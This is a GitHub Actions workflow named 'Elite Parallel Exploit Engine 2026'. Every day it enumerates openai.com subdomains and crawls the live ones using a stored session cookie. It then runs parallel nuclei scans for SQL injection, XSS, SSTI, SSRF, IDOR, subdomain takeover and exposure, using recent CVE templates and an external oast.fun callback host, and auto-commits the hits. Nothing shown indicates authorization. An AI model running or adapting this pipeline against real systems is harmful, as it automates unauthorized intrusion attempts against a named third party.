name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Go Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: 1. Passive Discovery
        run: subfinder -d openai.com -all -auth ${{ secrets.PDCP_API_KEY }} -silent -o subs.txt

      - name: 2. Cloud Discovery
        run: uncover -q "openai.com" -auth ${{ secrets.PDCP_API_KEY }} -limit 300 >> subs.txt || echo "done"

      - name: 3. Filter Alive
        run: cat subs.txt | sort -u | httpx -silent -o alive.txt

      - name: 4. Authenticated Crawl
        run: katana -list alive.txt -jc -kf all -d 2 -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" -o params_new.txt || touch params_new.txt

      - name: 5. Deduplication
        run: |
          touch params.txt
          grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt

      - name: 6. Update Master
        run: cat params.txt params_new.txt | sort -u > master_updated.txt

      - name: Upload Targets
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: |
            to_scan.txt
            master_updated.txt

  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Download Targets
        uses: actions/download-artifact@v4
        with:
          name: targets

      - name: Setup Nuclei
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          $HOME/go/bin/nuclei -ut
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Vulnerability Scan
        run: |
          if [ -s to_scan.txt ]; then
            nuclei -l to_scan.txt -tags ${{ matrix.vuln_type }},cve2025,cve2026 -auth ${{ secrets.PDCP_API_KEY }} -interactsh-server oast.fun -header "Cookie: ${{ secrets.OPENAI_COOKIE }}" -o results.txt
          fi

      - name: Commit Findings
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          for i in {1..15}; do
            git fetch origin main
            git rebase origin/main || (git rebase --abort && git reset --hard origin/main)
            [ -f master_updated.txt ] && cp master_updated.txt params.txt
            mkdir -p vulnerabilities
            [ -f results.txt ] && cp results.txt vulnerabilities/${{ matrix.vuln_type }}_hits.txt
            git add params.txt vulnerabilities/
            git commit -m "Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
          done
          
